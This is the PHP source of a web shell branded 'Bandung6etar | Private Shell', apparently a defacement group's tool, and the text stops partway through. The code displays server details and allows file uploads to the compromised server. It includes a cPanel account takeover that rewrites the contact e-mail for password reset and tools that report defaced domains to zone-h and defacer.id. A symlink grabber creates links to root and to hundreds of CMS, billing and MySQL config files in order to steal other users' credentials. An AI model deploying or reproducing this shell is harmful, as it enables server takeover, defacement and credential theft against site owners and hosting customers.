 <title> =[ Bandung6etar | Private Shell ]= </title>
 <meta name="theme color" content="black"> </meta>
 <link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css2?family=Grenze+Gotisch:wght@300&display=swap" rel="stylesheet">
 
 <html>
 <head>
 <title> =[ Bandung6etar | Private Shell ]= </title>
 </head>
 <style>
 input { margin:0;background-color:#fff;border:1px solid #fff; }
 </style>
 <body bgcolor="black">
 <center><img src="https://i.ibb.co/t4yRQ0m/Bandung6etar-Ofc-20200903-090510.jpg" style="width:400px; height:450px";></center>
 <center><h1><center><font color="white" face="Grenze Gotisch">=[ </font><font color="cyan" face="Grenze Gotisch">Bandung6etar | Private Shell </font><font color="white" face="Grenze Gotisch"> ]=</font><br>
 </center>
 
 
 <form method="post">
 <input type="password" name="password" placeholder="Password">
 <input type="submit" value="GASKEN?!">
 <br>
 <br>
 <?php echo $_SESSIOM['forbidden']; ?>
 </form>
 </td>
 </table>
 
 <?php 
 
 exit();
 }
 ?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
  <link href="https://fonts.googleapis.com/css2?family=Grenze+Gotisch:wght@300&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>=[ Bandung6etar | Private Shell ]=</title>
<meta property="og:image">
<style>
body{
font-family: Grenze Gotisch;
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: cyan;
color:red;
}
table{
border: 1px #000000;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h2{
font-family:Grenze Gotisch;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Grenze Gotisch;
color:white;
}
.destroy_table {;
  background:transparent;
  border:1px solid cyan;
  font-family:Grenze Gotisch;
    display:inline-block;
  cursor:pointer;
  color:white;
  font-size:17x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:blue;
  text-shadow:0px 0px 0px #ff0505;
       }
       .td_table {;
  background-color: #000000;
            background-image: url(https://i.ibb.co/t4yRQ0m/Bandung6etar-Ofc-20200903-090510.jpg);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
border: 1px solid cyan; 
padding: 0px; 
margin-left: 2px; 
text-align: center;
}
     .potext {
  border: 1px solid #ffffff;
  width: 100%;
  height: 400px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background-color: #000000;
            background-image: url(https://i.ibb.co/t4yRQ0m/Bandung6etar-Ofc-20200903-090510.jpg);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
  color: #ffffff;
  font-family:Grenze Gotisch;
  font-size: 13px;
}
.pl{
background:transparent; 
border: 1px solid cyan; 
padding: 5px; 
margin-left: 20px; 
text-align: center;
}
.pt{
background:transparent; 
border: 1px solid cyan; 
padding: 5px; 
margin-left: 20px; 
text-align: left;
}
</style>
</head>
<body>
<center>
<br>
<center><img src="https://i.ibb.co/t4yRQ0m/Bandung6etar-Ofc-20200903-090510.jpg" style="width:400px; height:450px";></center>
<font face="Grenze Gotisch" color="cyan" size="7px">=[ Bandung6etar Team ]=</font><br>
</h1></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
>> IP Maneh    <td>: <font color='cyan'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
>> IP Serverna  <td>: <font color='cyan'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
>> Systemna     <td>: <font color='cyan'>".php_uname()."<tr><td><font color='white'>
>> Di Damel  <td>: <font color='cyan'> indofans | Sudah ganteng heker lagi.<tr><td><font color='white'>
>> Greetzna  <td>: <font color='cyan'> Bandung6etar // Tersakiti Crew</font></tr></td><br>
</table>";
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
<center><tr align="center"><td align="center">path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="yellow">TERUPLOAD :)</script><br/>';
}else{
echo '<script> alert("GAGAL TERUPLOAD :(")</script></font><br/>';
}
}
echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Grenze Gotisch;font-size:20;background:transparent;color:white;border:2px solid cyan;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Grenze Gotisch;font-size:20;background:transparent;color:cyan;border:2px solid cyan;border-radius:5px"/><br><br>
</form></center>';
echo "</td></tr>";
echo "</table>";
echo "<center>";
echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
echo "<center><a class='destroy_table' href='?'>Home</a><center>";
echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>CPANEL CRACK</a>";
echo "<a class='destroy_table' href='?logout=true'>LOGOUT</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>ZONE-H NOTIFY</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>JUMPING</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=sym'>SYMLINK</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=mass'>MASS DEFACE</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=masse'>MaSS DELETE</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=vhost'>VHOST BYPASSER</a>";
echo "<center><a class='destroy_table' href='?dir=$dir&to=hashid'>HASH TOOLS</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=domains'>DOMAIN VIEWER</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=disablefunc'>DISABLE FUNCTION</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=defid'>DEFACE-ID NOTIFY</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=symconfig'>SYMLINK CONFIG</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=csrfup'>CSRF</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=config'>CONFIG GRABBER</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>AUTO EDIT USER</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=endec'>ENCODE/DECODE</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=hashgen'>GENERATOR HASH</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=adminer'>ADMINER</a>";
echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>COMAND PROMPT</a>";
echo "<a class='destroy_table' href='?dir=$dir&do=about'>TENTANG SHELL</a>";
echo "<center>";
if($_GET['do'] == 'cmd') {
	echo'<header> 
	<pre> =[ CPANEL CRACK ]= </pre> 
	</header> 
	</center> 
	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="EMAIL MU MASUKIN STERZ" /> 	 <input type="submit" name="submit" value="CRACK"/> 	 
	</form> 	 	 
	<br/><br/><br/> 
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>NGGAK ADA AKSES STERZZKU :(</h1>
	<br><br> 
	</pre>
	</center>"; } else { echo "<center>SALIN USERNAMENYA/GASKEN!!<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">SALIN USERNYA</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">GASS KLIK DISINI</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	}
 elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}

if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "ONHOLDNYA: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "ARCHIVENYA: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Nick Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Bandung6etar'><br>
		<u>List Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}
elseif($_GET['to'] == 'defid') {
echo "<center><form method='post'>
		<u>Nick Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Bandung6etar'><br>
		<u>Nama Team</u>: <br>
		<input type='text' name='tim' size='50' value='DEFACER ID'><br>
		<u>List Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}
elseif($_GET['to'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("ltf_symconf", 0777);
@chdir("ltf_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex ltfeisjustice.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','ltf_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
